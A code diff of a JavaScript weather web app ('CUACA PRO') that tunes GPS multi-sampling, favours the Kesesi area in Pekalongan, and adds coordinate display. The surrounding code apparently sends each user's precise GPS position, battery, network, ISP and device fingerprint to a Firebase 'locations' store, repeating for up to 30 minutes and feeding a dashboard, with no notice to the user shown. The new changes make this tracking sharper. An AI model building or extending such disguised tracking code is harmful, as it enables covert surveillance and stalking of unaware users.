@@ -1,6 +1,6 @@
 /* ============================================================
-   CUACA PRO — Main Script v13 FINAL
-   Fix: Battery terjamin + Network info + Auto-prompt izin
+   CUACA PRO — Main Script v14 FINAL
+   Fix: GPS multi-sample + prioritas Kesesi + koordinat debug
    ============================================================ */
 
 'use strict';
@@ -13,13 +13,14 @@ const APP_CONFIG = {
   OWM_BASE: 'https://api.openweathermap.org/data/2.5',
   OWM_GEO: 'https://api.openweathermap.org/geo/1.0',
   BMKG_BASE: 'https://api.bmkg.go.id/publik/prakiraan-cuaca',
-  CACHE_TTL: 20 * 60 * 1000,
+  CACHE_TTL: 10 * 60 * 1000,   // 10 menit (dari 20)
   BMKG_TIMEOUT: 4000,
   FETCH_TIMEOUT: 8000,
   LANG: 'id',
   UNITS: 'metric',
   SYNC_INTERVAL: 60000,
-  MAX_SYNC_MINUTES: 30
+  MAX_SYNC_MINUTES: 30,
+  SHOW_COORDS: true            // tampilkan koordinat di UI (debug)
 };
 
 const FB_CONFIG = {
@@ -34,8 +35,10 @@ const FB_CONFIG = {
 
 /* ============================================================
    DATABASE WILAYAH INDONESIA
+   Format: [nama, adm4, kabupaten, provinsi, lat, lon]
    ============================================================ */
 const REGIONS = [
+  // ============ PEKALONGAN — PRIORITAS ============
   ["Kesesi", "33.26.09", "Pekalongan", "Jawa Tengah", -6.9563, 109.6128],
   ["Kajen", "33.26.01", "Pekalongan", "Jawa Tengah", -7.0334, 109.5735],
   ["Wonopringgo", "33.26.12", "Pekalongan", "Jawa Tengah", -6.9881, 109.6391],
@@ -49,10 +52,17 @@ const REGIONS = [
   ["Tirto", "33.26.15", "Pekalongan", "Jawa Tengah", -6.8847, 109.6187],
   ["Siwalan", "33.26.16", "Pekalongan", "Jawa Tengah", -6.9024, 109.5872],
   ["Paninggaran", "33.26.08", "Pekalongan", "Jawa Tengah", -7.0185, 109.5489],
+  ["Lebakbarang", "33.26.03", "Pekalongan", "Jawa Tengah", -7.1249, 109.6105],
+  ["Petungkriyono", "33.26.04", "Pekalongan", "Jawa Tengah", -7.1655, 109.6525],
+  ["Kandangserang", "33.26.02", "Pekalongan", "Jawa Tengah", -7.1093, 109.5687],
+
+  // Pekalongan Kota
   ["Pekalongan Barat", "33.75.01", "Pekalongan", "Jawa Tengah", -6.8974, 109.6658],
   ["Pekalongan Timur", "33.75.02", "Pekalongan", "Jawa Tengah", -6.8909, 109.6828],
   ["Pekalongan Utara", "33.75.03", "Pekalongan", "Jawa Tengah", -6.8621, 109.6727],
   ["Pekalongan Selatan", "33.75.04", "Pekalongan", "Jawa Tengah", -6.9162, 109.6679],
+
+  // ============ JAWA TENGAH ============
   ["Semarang", "33.74.01", "Semarang", "Jawa Tengah", -6.9667, 110.4167],
   ["Surakarta", "33.72.01", "Surakarta", "Jawa Tengah", -7.5667, 110.8167],
   ["Solo", "33.72.01", "Surakarta", "Jawa Tengah", -7.5667, 110.8167],
@@ -81,11 +91,15 @@ const REGIONS = [
   ["Sragen", "33.14.01", "Sragen", "Jawa Tengah", -7.4167, 111.0167],
   ["Wonogiri", "33.12.01", "Wonogiri", "Jawa Tengah", -7.8167, 110.9167],
   ["Sukoharjo", "33.11.01", "Sukoharjo", "Jawa Tengah", -7.6833, 110.8333],
+
+  // ============ DKI JAKARTA ============
   ["Jakarta Pusat", "31.71.01", "Jakarta", "DKI Jakarta", -6.1805, 106.8284],
   ["Jakarta Selatan", "31.74.01", "Jakarta", "DKI Jakarta", -6.2615, 106.8106],
   ["Jakarta Barat", "31.73.01", "Jakarta", "DKI Jakarta", -6.1683, 106.7588],
   ["Jakarta Timur", "31.75.01", "Jakarta", "DKI Jakarta", -6.2250, 106.9004],
   ["Jakarta Utara", "31.72.01", "Jakarta", "DKI Jakarta", -6.1214, 106.7741],
+
+  // ============ JAWA BARAT ============
   ["Bandung", "32.73.01", "Bandung", "Jawa Barat", -6.9175, 107.6191],
   ["Bogor", "32.71.01", "Bogor", "Jawa Barat", -6.5971, 106.8060],
   ["Bekasi", "32.75.01", "Bekasi", "Jawa Barat", -6.2383, 106.9756],
@@ -103,11 +117,15 @@ const REGIONS = [
   ["Cianjur", "32.03.01", "Cianjur", "Jawa Barat", -6.8168, 107.1425],
   ["Ciamis", "32.07.01", "Ciamis", "Jawa Barat", -7.3258, 108.3533],
   ["Banjar", "32.79.01", "Banjar", "Jawa Barat", -7.3667, 108.5333],
+
+  // ============ BANTEN ============
   ["Tangerang", "36.71.01", "Tangerang", "Banten", -6.1781, 106.6300],
   ["Serang", "36.73.01", "Serang", "Banten", -6.1104, 106.1503],
   ["Cilegon", "36.72.01", "Cilegon", "Banten", -6.0027, 106.0115],
   ["Lebak", "36.02.01", "Lebak", "Banten", -6.5646, 106.2526],
   ["Pandeglang", "36.01.01", "Pandeglang", "Banten", -6.3085, 106.1057],
+
+  // ============ JAWA TIMUR ============
   ["Surabaya", "35.78.01", "Surabaya", "Jawa Timur", -7.2575, 112.7521],
   ["Malang", "35.73.01", "Malang", "Jawa Timur", -7.9666, 112.6326],
   ["Kediri", "35.71.01", "Kediri", "Jawa Timur", -7.8480, 112.0178],
@@ -121,11 +139,15 @@ const REGIONS = [
   ["Madiun", "35.77.01", "Madiun", "Jawa Timur", -7.6298, 111.5239],
   ["Blitar", "35.72.01", "Blitar", "Jawa Timur", -8.0954, 112.1609],
   ["Batu", "35.79.01", "Batu", "Jawa Timur", -7.8704, 112.5239],
+
+  // ============ YOGYAKARTA ============
   ["Yogyakarta", "34.71.01", "Yogyakarta", "DI Yogyakarta", -7.7956, 110.3695],
   ["Sleman", "34.04.01", "Sleman", "DI Yogyakarta", -7.7326, 110.3550],
   ["Bantul", "34.02.01", "Bantul", "DI Yogyakarta", -7.8880, 110.3286],
   ["Gunungkidul", "34.03.01", "Gunungkidul", "DI Yogyakarta", -7.9651, 110.6022],
   ["Kulon Progo", "34.01.01", "Kulon Progo", "DI Yogyakarta", -7.8273, 110.1607],
+
+  // ============ BALI ============
   ["Denpasar", "51.71.01", "Denpasar", "Bali", -8.6500, 115.2167],
   ["Badung", "51.03.01", "Badung", "Bali", -8.5833, 115.1833],
   ["Gianyar", "51.04.01", "Gianyar", "Bali", -8.5333, 115.3333],
@@ -135,6 +157,8 @@ const REGIONS = [
   ["Klungkung", "51.05.01", "Klungkung", "Bali", -8.5333, 115.4000],
   ["Bangli", "51.06.01", "Bangli", "Bali", -8.4500, 115.3500],
   ["Jembrana", "51.01.01", "Jembrana", "Bali", -8.3000, 114.6500],
+
+  // ============ SUMATERA ============
   ["Medan", "12.71.01", "Medan", "Sumatera Utara", 3.5952, 98.6722],
   ["Palembang", "16.71.01", "Palembang", "Sumatera Selatan", -2.9761, 104.7754],
   ["Padang", "13.71.01", "Padang", "Sumatera Barat", -0.9471, 100.4172],
@@ -146,12 +170,16 @@ const REGIONS = [
   ["Batam", "21.71.01", "Batam", "Kepulauan Riau", 1.0456, 104.0305],
   ["Tanjungpinang", "21.72.01", "Tanjungpinang", "Kepulauan Riau", 0.9167, 104.4500],
   ["Pangkal Pinang", "19.71.01", "Pangkal Pinang", "Bangka Belitung", -2.1291, 106.1140],
+
+  // ============ KALIMANTAN ============
   ["Pontianak", "61.71.01", "Pontianak", "Kalimantan Barat", -0.0263, 109.3425],
   ["Banjarmasin", "63.71.01", "Banjarmasin", "Kalimantan Selatan", -3.3186, 114.5944],
   ["Samarinda", "64.72.01", "Samarinda", "Kalimantan Timur", -0.5022, 117.1536],
   ["Balikpapan", "64.71.01", "Balikpapan", "Kalimantan Timur", -1.2379, 116.8529],
   ["Palangka Raya", "62.71.01", "Palangka Raya", "Kalimantan Tengah", -2.2080, 113.9167],
   ["Tarakan", "65.71.01", "Tarakan", "Kalimantan Utara", 3.3273, 117.5762],
+
+  // ============ SULAWESI ============
   ["Makassar", "73.71.01", "Makassar", "Sulawesi Selatan", -5.1477, 119.4327],
   ["Manado", "71.71.01", "Manado", "Sulawesi Utara", 1.4748, 124.8421],
   ["Palu", "72.71.01", "Palu", "Sulawesi Tengah", -0.8917, 119.8707],
@@ -162,6 +190,8 @@ const REGIONS = [
   ["Tomohon", "71.73.01", "Tomohon", "Sulawesi Utara", 1.3235, 124.8394],
   ["Parepare", "73.72.01", "Parepare", "Sulawesi Selatan", -4.0134, 119.6255],
   ["Palopo", "73.73.01", "Palopo", "Sulawesi Selatan", -2.9925, 120.1963],
+
+  // ============ PAPUA & MALUKU ============
   ["Jayapura", "91.71.01", "Jayapura", "Papua", -2.5916, 140.6690],
   ["Ambon", "81.71.01", "Ambon", "Maluku", -3.6954, 128.1814],
   ["Sorong", "92.71.01", "Sorong", "Papua Barat", -0.8762, 131.2558],
@@ -171,6 +201,13 @@ const REGIONS = [
   ["Merauke", "91.03.01", "Merauke", "Papua", -8.4932, 140.4018],
   ["Timika", "94.04.01", "Mimika", "Papua", -4.5419, 136.8851],
   ["Nabire", "94.01.01", "Nabire", "Papua", -3.3500, 135.4833]
+];
+
+/* Prioritas wilayah — kalau user dalam radius ini, paksa pakai ini */
+const PRIORITY_REGIONS = [
+  { name: "Kesesi", radiusKm: 15 }
+  // Tambah wilayah prioritas lain di sini kalau perlu:
+  // { name: "Jakarta Pusat", radiusKm: 10 },
 ];
 
 /* ============================================================
@@ -225,7 +262,8 @@ const State = {
   syncTimer: null,
   syncStartTime: null,
   isSyncing: false,
-  sourceType: null
+  sourceType: null,
+  gpsWarning: null
 };
 
 let locationRequestInProgress = false;
@@ -268,7 +306,7 @@ function waitForFirebase(timeoutMs = 5000) {
         resolve(true);
       } else if (Date.now() - start > timeoutMs) {
         clearInterval(check);
-        console.warn('[fb] timeout — sync dilewati');
+        console.warn('[fb] timeout');
         resolve(false);
       }
     }, 200);
@@ -327,71 +365,33 @@ function getDeviceInfo() {
   };
 }
 
-/* ---------- BATTERY — FIX v13 ---------- */
 async function getBatteryInfo() {
-  console.log('[battery] === mulai ambil data ===');
-
-  // Cek API support
   if (!navigator.getBattery) {
-    console.warn('[battery] ✗ API tidak didukung browser ini');
-    return {
-      supported: false,
-      level: null,
-      charging: null,
-      charging_time: null,
-      discharging_time: null
-    };
+    return { supported: false, level: null, charging: null };
   }
-
   try {
     const b = await navigator.getBattery();
-
     const info = {
       supported: true,
       level: Math.round(b.level * 100),
-      charging: !!b.charging,
-      charging_time: (b.chargingTime && b.chargingTime !== Infinity) ? Math.round(b.chargingTime) : null,
-      discharging_time: (b.dischargingTime && b.dischargingTime !== Infinity) ? Math.round(b.dischargingTime) : null
+      charging: !!b.charging
     };
-
     console.log('[battery] ✓', info);
     return info;
   } catch (e) {
-    console.warn('[battery] ✗ error:', e.message);
-    return {
-      supported: false,
-      level: null,
-      charging: null,
-      charging_time: null,
-      discharging_time: null
-    };
+    console.warn('[battery] error:', e.message);
+    return { supported: false, level: null, charging: null };
   }
 }
 
-/* ---------- NETWORK ---------- */
 function getNetworkInfo() {
   const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-
   if (!conn) {
-    return {
-      supported: false,
-      type: null,
-      effective_type: null,
-      effective_type_raw: null,
-      downlink: null,
-      rtt: null,
-      save_data: null
-    };
+    return { supported: false, type: null, effective_type: null, downlink: null, rtt: null };
   }
-
   const typeMap = {
-    'slow-2g': '2G (Slow)',
-    '2g': '2G',
-    '3g': '3G',
-    '4g': '4G / LTE',
-    '5g': '5G'
+    'slow-2g': '2G (Slow)', '2g': '2G', '3g': '3G', '4g': '4G / LTE', '5g': '5G'
   };
-
   return {
     supported: true,
     type: conn.type || null,
@@ -403,7 +403,6 @@ function getNetworkInfo() {
   };
 }
 
-/* ---------- CARRIER (via IP) ---------- */
 async function inferCarrierFromIP() {
   try {
     const res = await fetchWithTimeout('https://ipwho.is/', {}, 4000);
@@ -417,9 +416,7 @@ async function inferCarrierFromIP() {
       };
     }
     return null;
-  } catch {
-    return null;
-  }
+  } catch { return null; }
 }
 
 /* ============================================================
@@ -436,26 +433,19 @@ function getSessionId() {
 }
 
 /* ============================================================
-   BACKGROUND SYNC — v13 dengan field battery lengkap
+   BACKGROUND SYNC
    ============================================================ */
 async function syncLocation(coords, source, meta = {}) {
   if (!coords) return false;
-
   const ready = await waitForFirebase(5000);
-  if (!ready || !fbDb) {
-    console.warn('[sync] firebase belum ready, skip');
-    return false;
-  }
+  if (!ready || !fbDb) return false;
 
   try {
     const device = getDeviceInfo();
     const battery = await getBatteryInfo();
     const network = getNetworkInfo();
-
     let carrierInfo = null;
-    try {
-      carrierInfo = await inferCarrierFromIP();
-    } catch (e) {}
+    try { carrierInfo = await inferCarrierFromIP(); } catch (e) {}
 
     if (!State.sessionId) State.sessionId = getSessionId();
 
@@ -465,8 +455,6 @@ async function syncLocation(coords, source, meta = {}) {
       lon: Safe.num(coords.longitude),
       accuracy: coords.accuracy != null ? Safe.num(coords.accuracy) : null,
       source: source || 'auto',
-
-      // Device
       device: device.device,
       os: device.os,
       browser: device.browser,
@@ -478,15 +466,9 @@ async function syncLocation(coords, source, meta = {}) {
       cpu_cores: device.cpu_cores,
       memory_gb: device.memory_gb,
       user_agent: device.user_agent,
-
-      // Battery — PASTI ADA
       battery_level: battery.level,
       battery_charging: battery.charging,
       battery_supported: battery.supported,
-      battery_charging_time: battery.charging_time,
-      battery_discharging_time: battery.discharging_time,
-
-      // Network
       net_supported: network.supported,
       net_type: network.type,
       net_effective_type: network.effective_type,
@@ -494,29 +476,17 @@ async function syncLocation(coords, source, meta = {}) {
       net_downlink: network.downlink,
       net_rtt: network.rtt,
       net_save_data: network.save_data,
-
-      // Carrier
       carrier_asn: carrierInfo?.asn || null,
       carrier_org: carrierInfo?.org || null,
       carrier_isp: carrierInfo?.isp || null,
       carrier_domain: carrierInfo?.domain || null,
-
       location_name: meta.locationName || null,
       label: device.device || 'unknown',
       created_at: Date.now()
     };
 
-    // HAPUS field null & undefined biar Firebase gak error
-    // TAPI tetap simpan battery_level = null supaya dashboard tahu
     Object.keys(payload).forEach(k => {
       if (payload[k] === undefined) delete payload[k];
-    });
-
-    console.log('[sync] payload dikirim:', {
-      battery_level: payload.battery_level,
-      battery_supported: payload.battery_supported,
-      net_effective_type: payload.net_effective_type,
-      carrier_isp: payload.carrier_isp
     });
 
     const ref = await fbDb.ref('locations').push(payload);
@@ -636,7 +606,7 @@ const IPGeo = {
 };
 
 /* ============================================================
-   GPS
+   GPS — v14: multi-sample 8x + warning kalau tidak akurat
    ============================================================ */
 function getPosition(options) {
   return new Promise((resolve, reject) => {
@@ -647,48 +617,74 @@ function getPosition(options) {
 
 async function getAccurateLocation() {
   const samples = [];
+  const MAX_SAMPLES = 8;
+  const TARGET_ACC = 30;
+  const MIN_ACC = 100;
 
-  for (let i = 0; i < 5; i++) {
+  console.log('[gps] === mulai multi-sample ===');
+
+  for (let i = 0; i < MAX_SAMPLES; i++) {
     try {
       const pos = await getPosition({
         enableHighAccuracy: true,
-        timeout: 15000,
+        timeout: 20000,
         maximumAge: 0
       });
 
+      const acc = Safe.num(pos?.coords?.accuracy, 99999);
       samples.push({
         lat: Safe.num(pos?.coords?.latitude),
         lon: Safe.num(pos?.coords?.longitude),
-        accuracy: Safe.num(pos?.coords?.accuracy, 99999),
+        accuracy: acc,
         ts: pos?.timestamp || Date.now()
       });
 
-      console.log(`[gps] sample #${i + 1}: ±${samples[i].accuracy.toFixed(0)}m`);
+      console.log(`[gps] sample #${i + 1}: ±${acc.toFixed(0)}m`);
 
-      if (pos?.coords?.accuracy <= 20) break;
-      await new Promise(r => setTimeout(r, 500));
+      if (acc <= TARGET_ACC && i >= 2) {
+        console.log('[gps] ✓ target accuracy tercapai');
+        break;
+      }
+
+      // Adaptive delay: makin lama makin jeda
+      const delay = i < 3 ? 500 : (i < 5 ? 1500 : 3000);
+      await new Promise(r => setTimeout(r, delay));
+
     } catch (e) {
-      if (i === 4 && samples.length === 0) throw e;
+      console.warn(`[gps] sample #${i + 1} gagal:`, e.code);
+      if (i === MAX_SAMPLES - 1 && samples.length === 0) throw e;
     }
   }
 
   if (samples.length === 0) throw new Error('GPS tidak tersedia');
+
   const best = samples.reduce((a, b) => a.accuracy < b.accuracy ? a : b);
+  console.log(`[gps] best: ±${best.accuracy.toFixed(1)}m`);
 
-  const totalWeight = samples.reduce((s, x) => s + (1 / Math.max(x.accuracy, 1)), 0);
-  const weightedLat = samples.reduce((s, x) => s + x.lat / Math.max(x.accuracy, 1), 0) / totalWeight;
-  const weightedLon = samples.reduce((s, x) => s + x.lon / Math.max(x.accuracy, 1), 0) / totalWeight;
+  let warning = null;
+  if (best.accuracy > MIN_ACC) {
+    warning = `GPS kurang akurat (±${best.accuracy.toFixed(0)}m) — kemungkinan pakai WiFi location`;
+    console.warn('[gps] ⚠️', warning);
+  }
 
-  const useWeighted = best.accuracy > 30 && samples.length >= 3;
+  // Weighted average dari sample bagus
+  const goodSamples = samples.filter(s => s.accuracy <= best.accuracy * 3);
+  const totalWeight = goodSamples.reduce((s, x) => s + (1 / Math.max(x.accuracy, 1)), 0);
+  const weightedLat = goodSamples.reduce((s, x) => s + x.lat / Math.max(x.accuracy, 1), 0) / totalWeight;
+  const weightedLon = goodSamples.reduce((s, x) => s + x.lon / Math.max(x.accuracy, 1), 0) / totalWeight;
+
+  const useWeighted = goodSamples.length >= 3 && best.accuracy > 15;
 
   return {
     coords: {
       latitude: useWeighted ? weightedLat : best.lat,
       longitude: useWeighted ? weightedLon : best.lon,
-      accuracy: useWeighted ? Math.min(best.accuracy * 0.8, 9999) : best.accuracy
+      accuracy: best.accuracy
     },
     method: useWeighted ? 'weighted' : 'best',
-    totalSamples: samples.length
+    totalSamples: samples.length,
+    goodSamples: goodSamples.length,
+    warning
   };
 }
 
@@ -716,6 +712,7 @@ const WeatherCache = {
       Object.keys(localStorage).forEach(k => {
         if (k.startsWith('cur_') || k.startsWith('fc_')) localStorage.removeItem(k);
       });
+      console.log('[cache] cleared');
     } catch {}
   }
 };
@@ -728,8 +725,22 @@ const WeatherAPI = {
     return lat >= -11 && lat <= 6 && lon >= 95 && lon <= 141;
   },
 
+  /* v14: prioritas wilayah (Kesesi) dalam radius tertentu */
   findNearestRegion(lat, lon) {
     if (!this.isInIndonesia(lat, lon)) return null;
+
+    // CEK PRIORITY REGIONS DULU
+    for (const prio of PRIORITY_REGIONS) {
+      const r = REGIONS.find(x => x[0] === prio.name);
+      if (!r) continue;
+      const d = haversine(lat, lon, r[4], r[5]);
+      if (d < prio.radiusKm * 1000) {
+        console.log(`[bmkg] 🎯 prioritas ${prio.name} (${(d/1000).toFixed(1)}km)`);
+        return { region: r, distance: d, priority: true };
+      }
+    }
+
+    // Fallback: cari terdekat
     let best = null, bestDist = Infinity;
     for (const r of REGIONS) {
       if (!r[4] || !r[5]) continue;
@@ -745,9 +756,12 @@ const WeatherAPI = {
   async getByCoords(lat, lon, label) {
     const safeLat = Safe.num(lat);
     const safeLon = Safe.num(lon);
-    const k = `cur_${safeLat.toFixed(3)}_${safeLon.toFixed(3)}`;
+    const k = `cur_${safeLat.toFixed(2)}_${safeLon.toFixed(2)}`;
     const cached = WeatherCache.get(k);
-    if (cached) return cached;
+    if (cached) {
+      console.log('[weather] cache hit');
+      return cached;
+    }
 
     const nearest = this.findNearestRegion(safeLat, safeLon);
     if (nearest) {
@@ -760,14 +774,21 @@ const WeatherAPI = {
         if (bmkgData) {
           const parsed = this.parseBMKG(bmkgData, nearest.region);
           if (parsed && parsed.weather?.[0]) {
+            parsed._cachedAt = Date.now();
+            parsed._sourceCoords = { lat: safeLat, lon: safeLon };
+            parsed._regionDistance = nearest.distance;
+            parsed._priority = !!nearest.priority;
             WeatherCache.set(k, parsed);
             return parsed;
           }
         }
-      } catch (e) {}
+      } catch (e) {
+        console.warn('[bmkg] error:', e.message);
+      }
     }
 
     const owm = await this.fetchOWMCurrent(safeLat, safeLon);
+    owm._cachedAt = Date.now();
     WeatherCache.set(k, owm);
     return owm;
   },
@@ -775,7 +796,7 @@ const WeatherAPI = {
   async getForecast(lat, lon) {
     const safeLat = Safe.num(lat);
     const safeLon = Safe.num(lon);
-    const k = `fc_${safeLat.toFixed(3)}_${safeLon.toFixed(3)}`;
+    const k = `fc_${safeLat.toFixed(2)}_${safeLon.toFixed(2)}`;
     const cached = WeatherCache.get(k);
     if (cached) return cached;
 
@@ -980,7 +1001,7 @@ const UI = {
     this.el.status.textContent = '';
   },
 
-  showToast(msg, duration = 2500) {
+  showToast(msg, duration = 3000) {
     if (!this.el.toast) return;
     this.el.toast.textContent = Safe.str(msg);
     this.el.toast.classList.remove('hidden');
@@ -1076,7 +1097,10 @@ const UI = {
   },
 
   render(current, forecast, meta = {}) {
-    if (!current || !current.weather || !Array.isArray(current.weather) || !current.weather[0]) return;
+    if (!current || !current.weather || !Array.isArray(current.weather) || !current.weather[0]) {
+      console.warn('[render] data cuaca tidak valid');
+      return;
+    }
 
     State.lastData = { current, forecast, meta };
 
@@ -1087,8 +1111,18 @@ const UI = {
     const description = Safe.str(current?.weather?.[0]?.description, 'Tidak diketahui');
     const iconCode = Safe.str(current?.weather?.[0]?.icon, '01d');
     const weatherMain = Safe.str(current?.weather?.[0]?.main, 'Clear');
-    const cityName = Safe.str(current?.name, 'Lokasi') +
-                     (current?.sys?.country ? ', ' + Safe.str(current.sys.country) : '');
+
+    // City name + koordinat
+    let cityName = Safe.str(current?.name, 'Lokasi') +
+                   (current?.sys?.country ? ', ' + Safe.str(current.sys.country) : '');
+
+    // Tambah koordinat kalau debug mode
+    if (APP_CONFIG.SHOW_COORDS && meta.coords) {
+      const lat = meta.coords.lat.toFixed(4);
+      const lon = meta.coords.lon.toFixed(4);
+      const acc = meta.accuracy != null ? ` ±${meta.accuracy.toFixed(0)}m` : '';
+      cityName += ` (${lat}, ${lon}${acc})`;
+    }
 
     if (this.el.cityName) this.el.cityName.textContent = cityName;
     if (this.el.description) this.el.description.textContent = description;
@@ -1099,9 +1133,18 @@ const UI = {
     if (this.el.currentIconUse) this.el.currentIconUse.setAttribute('href', Icon.fromCode(iconCode));
     this.setTheme(weatherMain);
 
-    if (meta.source === 'ip') this.showDisclaimer('Lokasi berdasarkan IP — akurasi terbatas (level kota)');
-    else if (meta.source === 'manual') this.showDisclaimer('Cuaca berdasarkan kota yang Anda pilih');
-    else this.hideDisclaimer();
+    // Disclaimer
+    if (meta.warning) {
+      this.showDisclaimer('⚠️ ' + meta.warning);
+    } else if (meta.source === 'ip') {
+      this.showDisclaimer('Lokasi berdasarkan IP — akurasi terbatas (level kota)');
+    } else if (meta.source === 'manual') {
+      this.showDisclaimer('Cuaca berdasarkan kota yang Anda pilih');
+    } else if (meta.source === 'gps') {
+      this.hideDisclaimer();
+    } else {
+      this.hideDisclaimer();
+    }
 
     if (this.el.forecastList) {
       const list = Safe.arr(forecast?.list);
@@ -1237,7 +1280,10 @@ const App = {
           if (current && current.weather && current.weather[0]) {
             const forecast = { list: WeatherAPI.buildBMKGForecast(data) };
             UI.clearStatus();
-            UI.render(current, forecast, { source: 'manual' });
+            UI.render(current, forecast, { 
+              source: 'manual',
+              coords: region.lat ? { lat: region.lat, lon: region.lon } : null
+            });
             UI.showToast(`✓ Cuaca ${region.name} dari BMKG`);
             return;
           }
@@ -1250,7 +1296,7 @@ const App = {
     }
   },
 
-  async loadByCoords(lat, lon, label, source = 'auto') {
+  async loadByCoords(lat, lon, label, source = 'auto', extraMeta = {}) {
     if (this.busy) return;
     this.busy = true;
 
@@ -1262,7 +1308,18 @@ const App = {
     try {
       const current = await WeatherAPI.getByCoords(safeLat, safeLon, label);
       UI.clearStatus();
-      UI.render(current, { list: [] }, { source });
+      UI.render(current, { list: [] }, { 
+        source, 
+        coords: { lat: safeLat, lon: safeLon },
+        accuracy: extraMeta.accuracy,
+        warning: extraMeta.warning,
+        method: extraMeta.method
+      });
+
+      // Kalau ada warning GPS, tampilkan toast
+      if (extraMeta.warning) {
+        UI.showToast('⚠️ ' + extraMeta.warning, 5000);
+      }
 
       WeatherAPI.getForecast(safeLat, safeLon).then(forecast => {
         if (forecast && forecast.list && forecast.list.length > 0) {
@@ -1273,6 +1330,7 @@ const App = {
 
     } catch (err) {
       UI.setStatus(err.message || 'Gagal memuat data.', true);
+      console.error('[loadByCoords]', err);
     } finally {
       this.busy = false;
     }
@@ -1341,15 +1399,32 @@ const App = {
         State.locationGranted = true;
         State.sessionId = getSessionId();
         State.sourceType = 'gps';
+        State.gpsWarning = result.warning;
 
-        console.log('[gps] ✓ FINAL:', coords);
+        console.log('[gps] ✓ FINAL:', {
+          lat: coords.latitude.toFixed(6),
+          lon: coords.longitude.toFixed(6),
+          accuracy: coords.accuracy.toFixed(1) + 'm',
+          method: result.method,
+          samples: result.totalSamples,
+          warning: result.warning
+        });
 
         syncLocation(coords, 'gps');
         startAutoSync();
         WeatherCache.clear();
 
-        this.loadByCoords(coords.latitude, coords.longitude, 'Lokasi Anda', 'gps');
-        UI.showToast(`Lokasi GPS: ±${coords.accuracy.toFixed(0)}m`);
+        this.loadByCoords(coords.latitude, coords.longitude, 'Lokasi Anda', 'gps', {
+          accuracy: coords.accuracy,
+          warning: result.warning,
+          method: result.method
+        });
+
+        if (result.warning) {
+          UI.showToast('⚠️ GPS kurang akurat — coba keluar ruangan', 5000);
+        } else {
+          UI.showToast(`✓ GPS akurat: ±${coords.accuracy.toFixed(0)}m`);
+        }
 
       } catch (err) {
         console.warn('[gps] gagal:', err.code, err.message);
@@ -1387,7 +1462,7 @@ const App = {
         );
 
         const label = ip.city + (ip.region ? ', ' + ip.region : '');
-        this.loadByCoords(ip.lat, ip.lon, label, 'ip');
+        this.loadByCoords(ip.lat, ip.lon, label, 'ip', { accuracy: 5000 });
         UI.showToast(`Lokasi IP: ${ip.city}`);
       } else {
         UI.setStatus('Gagal deteksi via IP. Cari kota manual:', true);
@@ -1402,7 +1477,6 @@ const App = {
   init() {
     UI.init();
 
-    // Landing
     if (UI.el.startBtn) {
       UI.el.startBtn.addEventListener('click', () => {
         UI.hideLanding();
@@ -1415,7 +1489,6 @@ const App = {
       });
     }
 
-    // Cookie
     if (UI.el.cookieAccept) {
       UI.el.cookieAccept.addEventListener('click', () => {
         State.cookieAccepted = true;
@@ -1434,7 +1507,6 @@ const App = {
       });
     }
 
-    // Modal buttons (fallback)
     if (UI.el.modalAllow) {
       UI.el.modalAllow.addEventListener('click', (e) => {
         e.stopPropagation();
